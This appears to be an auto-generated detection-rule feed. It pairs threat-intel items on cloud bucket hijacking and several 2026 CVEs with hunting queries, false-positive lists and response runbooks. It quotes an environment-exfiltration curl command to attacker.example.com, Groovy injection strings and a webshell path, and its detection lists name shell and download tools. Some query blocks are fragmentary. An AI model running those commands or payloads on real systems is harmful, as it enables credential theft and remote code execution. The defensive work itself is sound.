let BadHashes = dynamic(["bd501fa31bf44a7e8beb6f7b628c6def", "bf754d8f29434fc997225e10f55de778", "e9580f58b18b4371868aa3442c57522c", "c5441dc903f845bdb93a98b949a612b2", "50739fb539504149a5fd85c85fe6750c"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

The Global Namespace Risk: Universal Bucket Hijacking Technique for Cloud Data Exfiltration

Unit 42 (Palo Alto)
2026-06-22 6 use cases 2 techniques 4 kill-chain phases detected

Unit 42 research details how attackers could exploit global name uniqueness in bucket hijacking to redirect cloud data streams across major CSPs. The post The Global Namespace Risk: Universal Bucket Hijacking Technique for Cloud Data Exfiltration appeared first on Unit 42 .

ATT&CKT1190 T1566

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] GCS bucket deletion of a logging-sink / data-stream destination (bucket-hijack precursor) · [LLM] AWS S3 DeleteBucket on a replication / log-delivery destination (bucket-hijack precursor) · [LLM] AWS S3 bucket DeleteBucket then CreateBucket of the SAME name across accounts (hijack signature)
GCS bucket deletion of a logging-sink / data-stream destination (bucket-hijack precursor) AIActions on Objectives Medium
Hunts deletion of a Google Cloud Storage bucket via storage.buckets.delete - the pivotal step in the Unit 42 universal bucket-hijacking technique, where an attacker deletes a sink/Pub-Sub/Storage-Transfer destination bucket so they can recreate the globally-unique name in their own project and reroute the data stream. Article-specific because it keys on the exact GCP IAM method named in the research rather than generic storage activity. Rationale: Keys on the exact GCP method storage.buckets.delete (and the storage.objects.delete empty-step) named in the Unit 42 research as the required hijack permissions; the bucket-delete is the only victim-side-visible event in the technique. Cross-checked Unit 42 article and MITRE T1537. Cross-checked against: • https://unit42.paloaltonetworks.com/cloud-bucket-hijacking-risks/ • https://attack.mitre.org/techniques/T1537/
ATT&CKT1485 T1537
Data sources
Expected false positives · estimated rate: high — model-assessed, tune to your environment
  • Planned decommissioning of a project / log archive bucket by a platform engineer
  • Terraform/Deployment-Manager teardown of ephemeral environments deleting and recreating buckets
  • CI/CD pipeline that rotates test buckets each run
  • Lifecycle automation emptying then deleting expired buckets
  • Org migration consolidating storage into a new bucket name
Response runbook
1) Triage: identify the deleted bucket name and confirm whether it was a destination for a logging sink, Pub/Sub subscription, or Storage Transfer job (it should NOT have been deleted while still referenced). Check the principalEmail and callerIp against known platform-admin identities/CI service accounts. 2) Contain: if the deletion was unexpected, freeze the actor's credentials/key and immediately re-create the bucket name in YOUR project to deny the attacker the global namespace claim; verify the sink is still writing to your project. 3) Hunt: search for the same bucket name being created in any external/unfamiliar project, prior storage.objects.delete bursts on that bucket, and the IAM grants (logging.sinks.update, storage roles) that preceded the delete.

| sort - lastTime
AWS S3 DeleteBucket on a replication / log-delivery destination (bucket-hijack precursor) AIActions on Objectives Medium
Hunts CloudTrail DeleteBucket on S3 - the destructive step that lets an attacker re-register the globally-unique bucket name in their own account and silently reroute an S3 replication or log-delivery stream per the Unit 42 technique. Deliberately distinct from the existing PutBucketReplication detection: it pivots on the delete, not the replication-config change. Rationale: Pivots on the CloudTrail DeleteBucket API named in the Unit 42 technique as the destructive precursor to recreating a hijacked globally-unique name; intentionally avoids overlap with Splunk's existing PutBucketReplication rule. Corroborated by MITRE T1537 and Splunk Security Content's bucket-replication exfil detection. Cross-checked against: • https://unit42.paloaltonetworks.com/cloud-bucket-hijacking-risks/ • https://research.splunk.com/cloud/eeb432d6-2212-43b6-9e89-fcd753f7da4c/ • https://www.varonis.com/blog/preventing-s3-bucket-namesquatting
ATT&CKT1485 T1537
Data sources
Expected false positives · estimated rate: high — model-assessed, tune to your environment
  • Engineer decommissioning a stale data-lake or log-archive bucket
  • Terraform/CloudFormation stack deletion tearing down a bucket
  • CI/CD ephemeral-bucket cleanup at end of build
  • Cost-optimization sweep removing empty/unused buckets
  • Account closure / region migration consolidating storage
Response runbook
1) Triage: confirm whether the deleted bucket was an active replication destination or log-delivery target (CloudTrail/S3 server access / ELB / Config delivery). Check the caller ARN, sourceIPAddress and userAgent against approved IaC pipelines. 2) Contain: if unsanctioned, immediately recreate the bucket name in the legitimate account to reclaim the global namespace, apply a restrictive bucket policy, and revoke the actor's session/keys. Enforce a data-perimeter SCP blocking writes to external-account buckets. 3) Hunt: look for PutBucketReplication or PutBucketLogging pointing the source at this name, GetBucketReplication recon, and any CreateBucket of the same name in another account.
title: AWS S3 Bucket Deletion (Bucket Hijacking Precursor)
id: 1d83b6f2-5a47-4c19-bb20-9f4e1c7a6d52
description: Detects S3 DeleteBucket events that may precede a globally-unique-name bucket hijack used to reroute replication or log-delivery streams.
references:
  - https://unit42.paloaltonetworks.com/cloud-bucket-hijacking-risks/
author: SOC Detection Engineering
date: 2026/06/26
tags:
  - attack.t1485
  - attack.t1537
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventSource: s3.amazonaws.com
    eventName: DeleteBucket
  filter_err:
    errorCode: '*'
  condition: selection and not filter_err
level: medium
source:cloudtrail @eventSource:s3.amazonaws.com @evt.name:DeleteBucket @evt.outcome:success
# log group: /aws/cloudtrail
fields @timestamp, eventName, userIdentity.arn, sourceIPAddress, userAgent, requestParameters.bucketName, awsRegion
| filter eventSource = "s3.amazonaws.com" and eventName = "DeleteBucket" and not isPresent(errorCode)
| sort @timestamp desc
CLOUD
sourcetype=aws:cloudtrail eventSource="s3.amazonaws.com" eventName=DeleteBucket
| search NOT errorCode=*
| stats min(_time) as firstTime max(_time) as lastTime values(sourceIPAddress) as src_ip values(userAgent) as user_agent by requestParameters.bucketName, userIdentity.arn, awsRegion, recipientAccountId
| sort - lastTime
AWS S3 bucket DeleteBucket then CreateBucket of the SAME name across accounts (hijack signature) AIActions on Objectives High
Correlates an S3 DeleteBucket immediately followed by a CreateBucket of the identical bucket name in a different account within an organization CloudTrail - the exact delete-and-recreate-under-attacker-account sequence Unit 42 describes. High-fidelity because legitimate workflows almost never delete a bucket in one account and recreate the same globally-unique name in another. Rationale: Encodes the literal hijack signature from the Unit 42 article - delete the bucket, then recreate the same globally-unique name under a different (attacker) account - as a cross-account temporal correlation on bucketName, which is far higher fidelity than either event alone. Validated against MITRE T1537 (same-provider account-to-account transfer). Cross-checked against: • https://unit42.paloaltonetworks.com/cloud-bucket-hijacking-risks/ • https://attack.mitre.org/techniques/T1537/
ATT&CKT1537 T1485
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Sanctioned cross-account migration moving a bucket to a new account under the same org
  • Disaster-recovery rehearsal recreating a bucket name in a backup account
  • Account-vending pipeline that recreates standardized bucket names per account
  • Manual admin recreating a mistakenly-deleted bucket in a different account
  • Blue-team validation of this exact namespace-reclaim mitigation
Suppression filter
| where NOT match(requestParameters.bucketName, "^(tmp|test|ci|build|ephemeral)-")
Response runbook
1) Triage: compare the recipientAccountId of the DeleteBucket vs the CreateBucket - if the recreating account is outside your trusted org/OU or unfamiliar, treat as active hijack. Identify what data stream (replication/log delivery/Storage) targeted that bucket name. 2) Contain: cut off the data stream at the source (pause replication / redirect log delivery), revoke the actor's credentials, and apply a data-perimeter SCP/VPC-endpoint policy denying writes to buckets in non-org accounts. Engage IR if the recreating account is external. 3) Hunt: enumerate all sinks/replication rules referencing the hijacked name, review recent GetBucketReplication/ListBuckets recon by the same principal, and audit which objects/logs were written after the recreate timestamp.
source:cloudtrail @eventSource:s3.amazonaws.com @evt.name:(DeleteBucket OR CreateBucket) @requestParameters.bucketName:*
# log group: /aws/cloudtrail  (organization trail spanning all accounts)
fields @timestamp, eventName, recipientAccountId, userIdentity.arn, requestParameters.bucketName
| filter eventSource = "s3.amazonaws.com" and eventName in ["DeleteBucket", "CreateBucket"] and not isPresent(errorCode)
| stats count_distinct(eventName) as distinctOps, count_distinct(recipientAccountId) as accounts, earliest(eventName) as firstOp, latest(eventName) as lastOp by requestParameters.bucketName
| filter distinctOps >= 2 and accounts >= 2
| sort accounts desc
CLOUD
sourcetype=aws:cloudtrail eventSource="s3.amazonaws.com" (eventName=DeleteBucket OR eventName=CreateBucket)
| search NOT errorCode=*
| stats earliest(_time) as firstTime latest(_time) as lastTime values(eventName) as ops dc(eventName) as opCount values(recipientAccountId) as accounts dc(recipientAccountId) as acctCount values(userIdentity.arn) as users values(sourceIPAddress) as src_ip by requestParameters.bucketName
| where opCount>=2 AND acctCount>=2
| eval windowSeconds=lastTime-firstTime
| sort - lastTime
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")

                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

motionEye: Authentication possible via password hash

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.

Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Unauthorized read of motionEye admin hash from /etc/motioneye/motion.conf
Unauthorized read of motionEye admin hash from /etc/motioneye/motion.conf AIActions on Objectives High
Hunts local shell utilities reading motionEye's world-readable /etc/motioneye/motion.conf, which stores the admin username and password hash. Under CVE-2026-46488 that hash is directly reusable as authentication material via the meye_password_hash cookie, so any non-service account reading this file is a pre-exploitation credential-theft step. Rationale: Pivots on the exact article-named file path /etc/motioneye/motion.conf paired with credential-reading shell utilities; the article states this file is world-readable and holds the admin hash used for the cookie bypass, making non-service-account reads high-fidelity. Cross-checked against GitLab advisory (advisories.gitlab.com/pypi/motioneye/CVE-2026-46488) confirming hash storage in motion.conf. Cross-checked against: • https://advisories.gitlab.com/pypi/motioneye/CVE-2026-46488/ • https://dailycve.com/motioneye-partial-authentication-bypass-path-traversal-cve-2026-31978-cve-2026-32315-cve-2026-46488-critical-dc-jun2026-600/
ATT&CKT1552.001 T1078
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate sysadmin backing up or troubleshooting motionEye config (cp/cat by root during maintenance)
  • Configuration-management tooling (Ansible/Salt) templating or reading motion.conf
  • Package upgrade to 0.44.0 that migrates/reads the legacy config file
  • Monitoring/backup agents that snapshot /etc recursively
Suppression filter
| where InitiatingProcessFileName !in~ ("ansible","python3","salt-minion","dpkg","apt","pip","pip3") and AccountName != "root"
Response runbook
1) Triage: identify the initiating user and parent process — confirm whether it maps to an interactive/low-privilege shell vs. root maintenance; check the host's motionEye version (<0.44.0 is vulnerable). 2) Contain: if the reader is an unexpected/low-priv account, rotate the motionEye admin password, restrict motion.conf permissions (chmod 600, owner motioneye), and upgrade motionEye to >=0.44.0. 3) Hunt: pivot on the same host/user for outbound HTTP requests to the motionEye web port carrying meye_password_hash / meye_username cookies (see companion UC), and for subsequent admin config changes or camera-stream access indicating the stolen hash was used.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has "/etc/motioneye/motion.conf"
| where FileName in~ ("cat","grep","egrep","less","more","head","tail","cp","scp","xxd","strings","awk","sed","vi","vim","nano")
| where AccountName !in~ ("motion","motioneye")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc

| order by TimeGenerated desc

XWiki JVM spawning OS command shell — CVE-2026-44179 excerpt-include Groovy RCE AIExploitation Medium
Hunts the post-exploitation execution stage of CVE-2026-44179: the XWiki application (Java/Tomcat JVM) spawning an OS command interpreter, which is what a weaponized `{{groovy}}` payload (Runtime.exec/'command'.execute()) inside the excerpt-include macro produces. A benign PoC only prints text, but real exploitation of this RCE drives child processes out of the java parent. Rationale: CVE-2026-44179 lets any editor inject `{{async}}{{groovy}}...{{/groovy}}{{/async}}` that runs in the XWiki JVM; weaponized Groovy uses Runtime.exec/.execute() which shows as the java/javaw parent spawning a shell — the cleanest host-side artifact of this specific RCE. Cross-checked against: • https://github.com/advisories/GHSA-w56x-9778-rppx • https://github.com/xwikisas/xwiki-pro-macros/blob/main/xwiki-pro-macros-ui/src/main/resources/Confluence/Macros/ExcerptInclude.xml#L277
ATT&CKT1190 T1059
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate XWiki/Confluence macros or scheduled jobs that shell out (e.g. Groovy scripts run by admins with programming right)
  • Java-based CI/build agents (Jenkins, Gradle) spawning shells on the same host
  • APM/monitoring agents launched by the JVM invoking whoami/curl for health checks
  • Admin troubleshooting running system commands via the XWiki scripting console
Suppression filter
| where ChildCmd !has "health" and ChildCmd !has "-version" and AccountName !in~ ("jenkins","gradle","build")
Response runbook
1) Triage: pull the child ProcessCommandLine and the parent java command line; confirm the host runs xwiki-pro-macros >=1.13 and <1.14.5, and correlate the process time against XWiki edit/save web logs for a page containing `{{groovy}}`/`{{async}}`. 2) Contain: isolate the XWiki host, kill the spawned process tree, and rotate any credentials/keys readable by the Tomcat/XWiki service account; block outbound from the JVM. 3) Hunt: search all wiki pages (DB `xwikidoc` title/content) for `{{async}}`/`{{groovy}}`/`excerpt-include`, review recently edited pages by low-privilege users, and check for dropped webshells/persistence under the XWiki data and Tomcat webapps directories.

XWiki excerpt-include macro injection in web request (CVE-2026-44179 payload) AIDelivery High
Hunts the delivery/exploit stage: HTTP requests to XWiki edit/save endpoints carrying the CVE-2026-44179 injection strings (`{{async}}`, `{{groovy}}`, `excerpt-include`) in the URL/query or referer, either plaintext or URL-encoded. This surfaces the page-title/content injection before the Groovy executes. Rationale: The advisory's PoC injects the literal XWiki-syntax strings `{{async}}{{groovy}}` and `{{excerpt-include}}` into page title/content via the edit/save endpoints; these tokens are extremely rare in legitimate XWiki traffic, making URL/query matches high-fidelity for the exploit attempt itself. Cross-checked against: • https://github.com/advisories/GHSA-w56x-9778-rppx • https://github.com/xwikisas/xwiki-pro-macros/blob/main/xwiki-pro-macros-ui/src/main/resources/Confluence/Macros/ExcerptInclude.xml#L277
ATT&CKT1190 T1059
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security scanners / pentest tools (Burp, Nuclei) probing the XWiki instance with the public PoC
  • Administrators legitimately authoring Groovy scripting macros with programming right
  • Documentation pages that quote the CVE PoC text verbatim for awareness
  • XWiki extension test/CI suites replaying macro fixtures
Suppression filter
| where csUserAgent !has "Nuclei" and csUserAgent !has "nmap" and cIP !in ("10.0.0.0/8 scanner range")
Response runbook
1) Triage: decode the URI, confirm the request targets /bin/save/ or /bin/edit/ on an xwiki-pro-macros >=1.13 <1.14.5 host, and identify the source IP and authenticated user (any user with edit right qualifies). 2) Contain: block the source IP at the WAF, disable or restrict edit rights for the offending account, and upgrade xwiki-pro-macros to 1.14.5. 3) Hunt: pivot to endpoint telemetry for java/javaw spawning shells around the same timestamp (UC1), and audit the wiki DB for pages whose title/content contain `{{async}}`/`{{groovy}}` that may still trigger on next render.
W3CIISLog

| where Decoded has_any ("{{groovy}}", "{{async}}", "excerpt-include")
| where csUriStem has_any ("/bin/save/", "/bin/edit/", "/bin/preview/", "/rest/")
| project TimeGenerated, Computer, cIP, csMethod, csUriStem, csUriQuery, Decoded, scStatus, csUserAgent
| order by TimeGenerated desc

mise version-manager spawning shell recon/exfil via Tera exec() in .tool-versions (CVE-2026-33646) AIExploitation High
Hunts arbitrary command execution triggered when a user with mise shell activation cd's into a repo containing a malicious .tool-versions file whose Tera {{ exec(command=...) }} payload runs during the hook-env parse. Targets the specific mise->shell parent/child tree running reconnaissance/exfil commands (id, whoami, env|base64) that legitimate version-manager activity never produces. Rationale: Pivots on the exact vuln mechanic: mise (InitiatingProcess/parent) driving a shell that runs the article's PoC recon/exfil payload (id > /tmp/..., whoami, env | base64, curl POST). Legitimate mise activity spawns tool runtimes (node/python), never raw shells running id/whoami/base64, making the parent+payload pair high-fidelity. Fixed in mise 2026.3.10. Cross-checked against: • https://github.com/advisories/GHSA-fjj5-v948-whjj • https://advisories.gitlab.com/cargo/mise/CVE-2026-33646/ • https://vulnerability.circl.lu/vuln/ghsa-fjj5-v948-whjj
ATT&CKT1059.004 T1204.002 T1554
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate `mise install` / plugin post-install hooks that run shell scripts (asdf-style plugins) invoking curl to fetch a runtime
  • A developer's own .tool-versions using a benign {{ exec(...) }} to compute a version, running a harmless command
  • mise running a project task or `mise run` that legitimately shells out to build tooling
  • Shell profile that wraps mise activation and re-execs sh for interactive setup
  • Env/base64 usage inside a legitimate build script parented by mise
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("install","plugin"," run ","exec ") and ProcessCommandLine has_any ("asdf","install.sh","registry"))
Response runbook
1) Triage: confirm the parent is genuinely mise and inspect the child ProcessCommandLine — recon/exfil strings (id>, whoami, env|base64, curl POST to external host) indicate real exploitation; grab the repo path (cwd) and the offending .tool-versions. 2) Contain: isolate the host, kill the mise/shell process tree, and rotate any credentials/tokens/SSH keys exposed via the user's environment (PRISTINE_ENV is passed to the payload). Enforce `paranoid=true` and upgrade mise to >=2026.3.10. 3) Hunt: pull the .tool-versions file content from the repo, search other repos the user cloned for {{ exec / {% / read_file, review outbound connections from mise-descended processes, and check version control for the malicious PR/commit that introduced the template.

| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "mise" or InitiatingProcessFolderPath endswith "/mise"
| where FileName in~ ("sh","bash","zsh","dash","id","whoami","curl","wget","env","base64","nc")
| where ProcessCommandLine has_any ("whoami","env | base64","base64","curl","wget","bash -i","/tmp/") or ProcessCommandLine matches regex @"(?i)\bid\b\s*>"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath, InitiatingProcessParentFileName
| order by Timestamp desc

Outbound exfiltration from a mise-spawned network client (Tera exec() curl of host environment) AIexfil Medium
Hunts the CVE-2026-33646 data-exfiltration variant where the .tool-versions Tera payload runs curl/wget to POST the victim's full environment (env | base64, including tokens/API keys/SSH agent) to an attacker endpoint. Pivots on a mise-parented process opening an outbound public connection, distinct from the on-host recon detection. Rationale: Uses the article's alternative PoC directly: `curl -s -X POST -d "$(env | base64)" https://attacker.example.com/collect` run by a mise-descended process. The parent=mise plus outbound-public + base64/env command line is the exfil signature and captures credential theft via PRISTINE_ENV; Defender network table gives the destination, process tables give the command. Cross-checked against: • https://github.com/advisories/GHSA-fjj5-v948-whjj • https://advisories.gitlab.com/cargo/mise/CVE-2026-33646/ • https://vulnerability.circl.lu/vuln/ghsa-fjj5-v948-whjj

Data sourcesEndpoint.Processes Network_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • mise legitimately downloading a tool runtime via an internal curl/http fetch during `mise install`
  • A project task run through mise that calls curl/wget to a package registry or artifact store
  • Developer tooling using python -m http.client / requests parented by mise for a build step
  • mise self-update reaching github.com over HTTPS
  • Internal telemetry/observability agent invoked as a mise task posting metrics
Suppression filter
| where not (RemoteUrl has_any ("github.com","githubusercontent.com","registry.npmjs.org","pypi.org","files.pythonhosted.org","nodejs.org","mise.jdx.dev"))
Response runbook
1) Triage: resolve RemoteIP/RemoteUrl reputation and inspect InitiatingProcessCommandLine — an external, non-registry host receiving a POST with base64/env content confirms exfiltration; capture the cwd and the .tool-versions payload. 2) Contain: isolate the host, block the destination IP/domain, kill the process tree, and immediately rotate every credential reachable from the user's shell (cloud tokens, API keys, SSH keys, Git PATs) since PRISTINE_ENV was exposed. 3) Hunt: review DNS/proxy for the same destination across other developer hosts, grep cloned repos for {{ exec / read_file in .tool-versions, and identify the malicious commit/PR; enforce paranoid mode and upgrade mise to >=2026.3.10.

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] PHP webshell dropped into Paymenter ticket-attachments storage dir (CVE-2025-58048)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Paymenter webshell access via /storage/ticket-attachments/*.php (CVE-2025-58048)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Paymenter web-server process spawning shell / recon (post-RCE, CVE-2025-58048)
Paymenter webshell access via /storage/ticket-attachments/*.php (CVE-2025-58048) AIExploitation High
Hunts HTTP requests to executable PHP files under Paymenter's public ticket-attachments storage path, the exact route CVE-2025-58048 abuses for RCE. Legitimate ticket attachments are images/PDFs served for download; a .php/.phtml under /storage/ticket-attachments/ is the malicious webshell being invoked. Rationale: Uses the exact public path (public/ticket-attachments → /storage/ticket-attachments/) confirmed in patch commit 87c3db4, plus DailyCVE's /storage/attachments/shell.php PoC. A PHP-family extension under this download-only path is high-fidelity — legitimate attachments are images/PDFs. Cross-checked against: • https://github.com/Paymenter/Paymenter/commit/87c3db42282ada1e3cda54b9a01f846926c0669b • https://dailycve.com/paymenter-remote-code-execution-rce-via-unrestricted-file-upload-cve-2025-58048-critical-dc-jun2026-543/ • https://nvd.nist.gov/vuln/detail/CVE-2025-58048
ATT&CKT1190 T1505.003
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security scanner / pentest tooling (Burp, Nuclei) probing /storage/ for PHP files
  • A file legitimately named with '.php' in its display name but stored as a non-executable object (rare)
  • Vulnerability-management authenticated scans replaying the CVE PoC
  • Uptime/synthetic monitors configured to hit an attachment URL
Suppression filter
| where HttpStatusCode in ("200","500") and UserAgent !has "Nuclei" and UserAgent !has "Burp"
Response runbook
1) Triage: pull the full request/response for the /storage/*.php hits — a 200 with non-empty body means the shell executed; capture src IP, user-agent, and the exact filename. 2) Contain: apply the advisory workaround (nginx force-download of /storage/ or WAF-block /storage/*.php) and pull the offending file from storage/app/public/ticket-attachments/ for analysis; if RCE confirmed, isolate the web host. 3) Hunt: identify the authenticated user who created the ticket that dropped the file, review all recent uploads to ticket-attachments for PHP-family extensions, and check for outbound C2 and web-server-user shell activity (see companion UCs).
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "/storage/" and (Url has "/ticket-attachments/" or Url has "/attachments/")
| where Url matches regex @"(?i)\.(php|php3|php4|php5|php7|phtml|phar|pht|phps)(\?|$)"
| project TimeGenerated, SrcIpAddr, HttpMethod, Url, HttpStatusCode, UserAgent = HttpRequestHeaderUserAgent, DstHostname, DvcHostname
| order by TimeGenerated desc

PHP webshell dropped into Paymenter ticket-attachments storage dir (CVE-2025-58048) AIDelivery High
Detects the write of a PHP-family file into Paymenter's storage/app/public/ticket-attachments directory by the web-server process — the file-drop step of CVE-2025-58048. Legitimate attachments here are images/PDFs, so an executable extension written by php-fpm/nginx is the webshell landing. Rationale: Keys on the exact Laravel store path 'public/ticket-attachments' from patch commit 87c3db4 plus a PHP-family extension and a web-server writer process — the precise file-drop signature of the unrestricted upload, distinct from benign image/PDF attachments. Cross-checked against: • https://github.com/Paymenter/Paymenter/commit/87c3db42282ada1e3cda54b9a01f846926c0669b • https://advisories.gitlab.com/composer/paymenter/paymenter/CVE-2025-58048/
ATT&CKT1505.003 T1190
